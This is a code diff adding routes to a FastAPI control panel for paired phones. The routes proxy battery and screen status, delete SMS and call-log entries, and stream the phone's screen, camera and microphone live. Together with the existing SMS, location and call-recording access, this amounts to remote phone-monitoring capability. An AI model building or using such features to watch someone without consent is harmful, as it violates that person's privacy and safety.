@@ -4,7 +4,9 @@ import time
 import json
 from pathlib import Path
 from fastapi import FastAPI, Request, HTTPException, Response, Depends
-from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse, FileResponse
+from fastapi.responses import (
+    HTMLResponse, JSONResponse, RedirectResponse, FileResponse, StreamingResponse,
+)
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
 from pydantic import BaseModel
@@ -15,6 +17,7 @@ from .device_client import (
     health, pair, device_info, location_current, camera_list, camera_capture,
     camera_capture_file, call_logs, sms, callrecorder_status,
     callrecorder_toggle, call_recordings, video_record, video_list, video_file,
+    battery, sms_delete, calllog_delete, screen_status, stream,
 )
 from .device_manager import registry
 
@@ -270,6 +273,136 @@ async def device_sms(host: str, port: int, box: str = "inbox", limit: int = 100,
                   include_body=bool(include_body), port=dev.port,
                   cert_fp=dev.cert_fp or None)
     return info
+
+# ---------- v2.3.0 routes: battery, deletes, live streams ----------
+
+class IdRequest(BaseModel):
+    id: int
+
+@app.get("/api/device/{host}/{port}/battery")
+async def device_battery(host: str, port: int, _=Depends(require_login)):
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    info, _ = battery(dev.host, dev.token or "", dev.port,
+                      cert_fp=dev.cert_fp or None)
+    return info
+
+@app.get("/api/device/{host}/{port}/screen/status")
+async def device_screen_status(host: str, port: int, _=Depends(require_login)):
+    """Proxy the phone's screen-capture backend status (live-view gating)."""
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    info, _ = screen_status(dev.host, dev.token or "", dev.port,
+                            cert_fp=dev.cert_fp or None)
+    return info
+
+@app.post("/api/device/{host}/{port}/sms/delete")
+async def device_sms_delete(host: str, port: int, req: IdRequest,
+                            _=Depends(require_login)):
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    info, _ = sms_delete(dev.host, req.id, dev.token or "", dev.port,
+                         cert_fp=dev.cert_fp or None)
+    return info
+
+@app.post("/api/device/{host}/{port}/logs/calls/delete")
+async def device_calllog_delete(host: str, port: int, req: IdRequest,
+                                _=Depends(require_login)):
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    info, _ = calllog_delete(dev.host, req.id, dev.token or "", dev.port,
+                             cert_fp=dev.cert_fp or None)
+    return info
+
+@app.get("/api/device/{host}/{port}/stream/screen")
+async def device_screen_stream(host: str, port: int, quality: int = 70,
+                               _=Depends(require_login)):
+    """Proxy the phone's live screen MJPEG stream (accessibility capture)."""
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+
+    def gen():
+        try:
+            yield from stream(
+                dev.host, f"/api/v1/stream/screen?quality={quality}",
+                token=dev.token or "", port=dev.port, cert_fp=dev.cert_fp or None,
+            )
+        except RuntimeError as e:
+            yield f"data:error\t{str(e)}".encode()
+
+    return StreamingResponse(
+        gen(), media_type="multipart/x-mixed-replace; boundary=frame",
+        headers={"Cache-Control": "no-store"},
+    )
+
+@app.get("/api/device/{host}/{port}/stream/camera")
+async def device_camera_stream(host: str, port: int, camera: str = "front",
+                               quality: int = 55, _=Depends(require_login)):
+    """Proxy the phone's live camera MJPEG stream (front cam = PiP source)."""
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+
+    def gen():
+        try:
+            yield from stream(
+                dev.host, f"/api/v1/stream/camera?camera={camera}&quality={quality}",
+                token=dev.token or "", port=dev.port, cert_fp=dev.cert_fp or None,
+            )
+        except RuntimeError as e:
+            yield f"data:error\t{str(e)}".encode()
+
+    return StreamingResponse(
+        gen(), media_type="multipart/x-mixed-replace; boundary=frame",
+        headers={"Cache-Control": "no-store"},
+    )
+
+@app.get("/api/device/{host}/{port}/stream/mic")
+async def device_mic_stream(host: str, port: int, _=Depends(require_login)):
+    """Proxy the phone's live mic stream (raw PCM16 mono 44.1kHz)."""
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+
+    def gen():
+        try:
+            yield from stream(
+                dev.host, "/api/v1/stream/mic",
+                token=dev.token or "", port=dev.port, cert_fp=dev.cert_fp or None,
+            )
+        except RuntimeError as e:
+            yield f"data:error\t{str(e)}".encode()
+
+    return StreamingResponse(
+        gen(), media_type="application/octet-stream",
+        headers={"Cache-Control": "no-store", "X-Audio-Format": "pcm16-mono-44100"},
+    )
 
 @app.post("/api/device/{host}/{port}/camera/capture/pull")
 async def device_camera_capture_pull(host: str, port: int, camera_id: str = "back",
